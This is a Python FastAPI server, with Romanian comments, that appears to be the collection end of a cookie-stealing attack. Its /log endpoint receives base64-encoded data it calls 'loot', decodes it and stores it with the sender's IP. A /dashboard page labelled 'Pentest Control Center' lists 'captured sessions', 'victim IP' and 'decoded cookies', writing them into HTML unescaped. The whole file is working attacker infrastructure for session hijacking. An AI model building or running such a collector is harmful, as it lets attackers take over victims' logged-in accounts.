from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import base64
import datetime

app = FastAPI()
sessions_db = []

@app.get("/log")
async def collect(data: str, request: Request):
    try:
        # Decodăm automat prada
        decoded = base64.b64decode(data).decode('utf-8', errors='ignore')
    except:
        decoded = data
        
    entry = {
        "id": len(sessions_db) + 1,
        "timestamp": datetime.datetime.now().strftime("%H:%M:%S"),
        "ip": request.client.host,
        "payload": decoded
    }
    sessions_db.append(entry)
    return {"status": "success"}

@app.get("/dashboard", response_class=HTMLResponse)
async def view_dashboard():
    # Creăm un tabel HTML frumos
    html_content = """
    <html>
        <head>
            <title>Pentest Control Center</title>
            <style>
                body { font-family: sans-serif; background: #1a1a1a; color: white; padding: 20px; }
                table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                th, td { border: 1px solid #333; padding: 12px; text-align: left; }
                th { background: #333; color: #00ff00; }
                tr:hover { background: #252525; }
                .cookie { color: #00ff00; font-family: monospace; font-size: 12px; word-break: break-all; }
            </style>
        </head>
        <body>
            <h1>🚀 Sesiuni Capturate (Live Feed)</h1>
            <table>
                <tr>
                    <th>ID</th>
                    <th>Ora</th>
                    <th>IP Victima</th>
                    <th>Cookie-uri Decodate</th>
                </tr>
    """
    for s in reversed(sessions_db):
        html_content += f"""
                <tr>
                    <td>{s['id']}</td>
                    <td>{s['timestamp']}</td>
                    <td>{s['ip']}</td>
                    <td class="cookie">{s['payload']}</td>
                </tr>
        """
    html_content += "</table></body></html>"
    return html_content
